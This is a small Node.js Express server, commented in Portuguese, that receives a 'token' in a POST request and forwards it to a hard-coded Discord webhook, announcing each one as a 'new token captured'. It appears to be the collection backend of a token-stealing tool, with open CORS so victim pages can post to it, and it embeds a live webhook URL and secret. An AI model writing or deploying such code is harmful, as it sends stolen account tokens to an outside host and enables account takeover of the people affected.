const express = require('express');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args)); // Usar fetch com Node 18+
const cors = require('cors');
const app = express();

// Middleware para permitir CORS e parsing de JSON
app.use(cors());
app.use(express.json());

// URL da webhook do Discord
const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1366557827107393608/ziqyGd8ZjfT3llWnKeNXIsDnFQr6XhkqLy-7ASQk7WCL2gMN3IAIe6sx4m0XWm_j5NcX';

// Rota para enviar o token para o Discord via webhook
app.post('/send-to-discord', async (req, res) => {
  const { token } = req.body;

  // Verifica se o token foi enviado
  if (!token) {
    return res.status(400).send("Token ausente.");
  }

  try {
    // Formata a mensagem que será enviada para o Discord
    const mensagemFormatada = `🔐 Novo token capturado:\n\`\`\`${token}\`\`\``;

    // Envia a mensagem para o Discord via webhook
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: mensagemFormatada })
    });

    // Verifica se a requisição foi bem-sucedida
    if (!response.ok) {
      const text = await response.text();
      console.error("Erro do Discord:", response.status, text);
      return res.status(500).send("Falha ao enviar para o Discord.");
    }

    // Responde com sucesso
    res.sendStatus(200);
  } catch (error) {
    console.error("Erro ao enviar para o Discord:", error);
    res.status(500).send("Erro interno do servidor.");
  }
});

// Rota de teste para acessar via navegador (GET)
app.get('/', (req, res) => {
  res.send('Servidor online. Use POST em /send-to-discord para enviar o token.');
});

// Porta para rodar o servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
